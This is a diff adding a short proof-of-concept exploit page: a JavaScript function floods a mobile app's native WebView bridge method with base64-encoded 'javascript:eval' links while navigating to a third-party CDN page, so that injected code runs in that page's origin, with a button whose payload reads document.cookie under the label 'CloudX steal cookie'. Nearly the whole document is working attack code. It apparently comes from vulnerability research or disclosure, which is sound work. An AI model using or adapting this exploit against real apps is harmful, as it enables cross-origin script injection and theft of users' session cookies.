@@ -1,0 +1,21 @@
+function triggerPoc(url, code) {
+        const currUrl = location.href;
+        const payload = `
+        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
+            window.__cloudx_called = true;
+            ${code}
+        }
+    `;
+        const base64 = btoa(payload);
+        for (let i = 0; i < 4000; i++) {
+            setTimeout(function () {
+                
+                    window.messageDetailProxy.onH5ClickJumpLink(
+                       1, `javascript:eval(atob("${base64}"));//`
+                    );
+                
+            }, i);
+        }
+        location.href = url;
+    }
+<button style="width:800px;height:200px;font-size:30px;" onclick="triggerPoc('https://contentcenter-drcn.dbankcdn.cn/cch5/AIBussiness-ScanKit/videoeditShare/videoeditShare/index.html', `console.log('CloudX steal cookie : ' + document.cookie)`)">CloudX steal cookie</button>
